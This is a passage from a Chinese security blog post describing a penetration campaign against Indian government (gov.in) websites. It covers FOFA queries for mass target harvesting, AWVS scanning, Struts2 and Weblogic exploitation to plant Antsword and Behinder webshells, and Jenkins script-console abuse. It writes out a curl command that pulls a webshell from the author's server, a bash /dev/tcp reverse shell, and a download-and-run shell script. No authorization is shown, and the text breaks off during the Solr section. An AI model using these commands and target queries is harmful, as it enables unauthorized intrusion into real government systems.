---
title: 一次暴露面全开的红帽渗透测试【getshell】
url: https://www.secpulse.com/archives/202971.html
source: 安全脉搏
date: 2023-08-11
fetch_date: 2025-10-04T11:59:48.687460
---

# 一次暴露面全开的红帽渗透测试【getshell】

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 一次暴露面全开的红帽渗透测试【getshell】

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-08-10

23,337

# 0x01、信息收集阶段

注：本次信息收集过程主要使用FOFA网络探测平台 [https://fofa.info/](https://fofa.info/%3D%3D%3D)

一开始进行收集的时候，有点迷，直接进行了大面积的"gov.in"域名收集

```
host="gov.in" && country="IN"
```

![image-20230711021949594](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326831.png)

哈哈68465条数据，想想就起飞，但是有个问题来了，怎么下载到本地，高级用户的API也只能调用下载1w条数据，左思右想。

试着写了个脚本看看：

```
import pythonfofa
import csv

filename = "IN_domain.csv"

email = 'u_mail'
key = 'u_API_KEY'
search = pythonfofa.Client(email, key)
get_data = search.search('host="gov.in" && country="IN"', size=70000)
# print(get_data)

requests = [result[1] for result in get_data['results']]
print(requests)
# 打开CSV文件并设置写入模式
with open(filename, "w", newline="") as file:
    writer = csv.writer(file)

    # 遍历请求列表
    for request in requests:
        # 在控制台打印域名
        print(request)

        # 检测域名是否包含"http://"
        if not request.startswith("http://") and not request.startswith("https://"):
            # 如果不包含，则在域名前添加"http://"
            request = "http://" + request

        # 在域名后添加斜杠"/"
        request += "/"

        # 将请求和值"1"作为一行写入CSV文件
        writer.writerow([request, 1])
```

是的，肯定不能跑，下断点，调试看看

![image-20230711024218564](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326833.png)

很好确实是不能直接干7w条，换个收集思路，收集主流框架进行相应的漏扫

主流框架的相关漏洞的FOFA规则语句：

**Fastjson**

```
app="Fastjson" && host="in" && country="IN" && status_code="200" && (port="80" || port="443")
```

**Struts2**

```
app="Struts" && host="in" && country="IN" && status_code="200" && (port="80" || port="443")
```

**Log4j2**

```
(app="Log4j2" && host="in" && country="IN" && status_code="200" && (port="80" || port="443"))
```

其他的也都大同小异，照葫芦画瓢就行。

![image-20230711025300355](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326834.png)

目标站点收集差不多了，就是漏洞探测阶段了。

【---- 帮助网安学习，以下所有学习资料免费领！领取资料加 we~@x：yj009991，备注 “安全脉搏” 获取！】
① 网安学习成长路径思维导图
② 60 + 网安经典常用工具包
③ 100+SRC 漏洞分析报告
④ 150 + 网安攻防实战技术电子书
⑤ 最权威 CISSP 认证考试指南 + 题库
⑥ 超 1800 页 CTF 实战技巧手册
⑦ 最新网安大厂面试题合集（含答案）
⑧ APP 客户端安全检测指南（安卓 + IOS）

## 0x02、漏洞探测及利用

### Struts2：

直接掏出大范围漏扫AWVS就行批量漏洞探测：

![image-20230711025640689](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326835.png)

第一天数据就直接起飞，因为本次目标是==getshell==直接忽略中低危漏洞告警，查看高危漏洞：

![image-20230711025838442](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326836.png)

很好一堆==Struts2==漏洞，直接上工具：

![image-20230711030506931](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326837.png)

得到一个RCE（远程命令执行漏洞），远程写入==shell==，先利用工具生成一个==Antsword(蚁剑)jsp格式的shell==

![image-20230711030808818](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326838.png)

将shell放到一个公网服务器上，接着执行命令查看web路径：`/var/tomcat9/pmrportal/ROOT/`

![image-20230711031350331](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326840.png)

直接执行

```
curl -o /var/tomcat9/pmrportal/ROOT/shell.jsp http://u_ip/antsword.jsp
```

然后webshell工具Antsword连接即可：

![image-20230711031634840](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326841.png)

爆出的该S2-045的漏洞的还有几个，getshell方式同上，不进行细述了**\_\_****\_\_****\_\_****\_\_****\_\_****\_**。

### Weblogic：

![image-20230711025901659](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326842.png)

很好用的awvs，直接上工具注入内存马：

![image-20230713175036472](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326843.png)

冰蝎连接webshell：

![image-20230713175143564](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326844.png)

同类型的漏洞还有几个，getshell的方式都一致，不一一概述了》》

（PS：这个时候已经有些疲软了，没有去手测upload的点）

### Jenkins：

中途其他框架没有收获的时候，就去浏览知识的海洋了，看到一个存在大量未授权+RCE的框架漏洞（**Jenkins**），二话不说，直接上FOFA：

```
(app="JENKINS" && title=="Dashboard [Jenkins]" && country="IN" && status_code="200") && (port="80" || port="443")
```

![image-20230713220128955](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326845.png)

一看86条资产，有戏，数量不多，直接手测：

![image-20230713180849084](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326846.png)

存在未授权，访问manager --> script页面，进行命令执行测试：

```
println "ls -al".execute().text
```

![image-20230713181156856](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326847.png)

存在命令执行，尝试反弹shell：

```
println "bash -i >& /dev/tcp/ip/port 0<&1".execute().text
```

接收shell的服务器开启端口监听：

![image-20230713181947756](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326848.png)

执行命令

![image-20230713181823099](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326849.png)

发现没有shell反弹过来，猜测不能在web端执行反弹shell，于是将反弹shell的命令写入.sh文件中，然后执行，进行反弹shell操作：

在sh文件中写入如下内容：

```
bash -i >& /dev/tcp/ip/port 0<&1
```

保存在开放的web端口，在jenkins服务中执行如下curl命令远程下载sh文件：

```
println "curl - o /tmp/jenkins.sh http://u_ip:port/jenkins.sh".execute().text
```

![image-20230713182926953](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326850.png)

查看.sh文件是否获取成功：

```
println "ls -al /tmp".execute().text
```

![image-20230713183110423](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326851.png)

获取.sh文件成功，执行文件，反弹shell：

开启监听：

![image-20230713183406307](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326852.png)

执行命令，启动.sh文件：

```
println "bash /tmp/jenkins.sh".execute().text
```

![image-20230713183606528](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326853.png)

![image-20230713183513017](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202308081326854.png)

成功监听到谈过来的shell，又拿下一台！其他的没有存在未授权，便没有尝试。

### Apache-Solr

闲着没事，打开文库看了几篇RCE复现，心血来潮，打开FOFA：

```
country="IN" && app="Apache-Solr" && status_code="200" && (port="443" || port="80")
```

![image-20230719101927146](ht...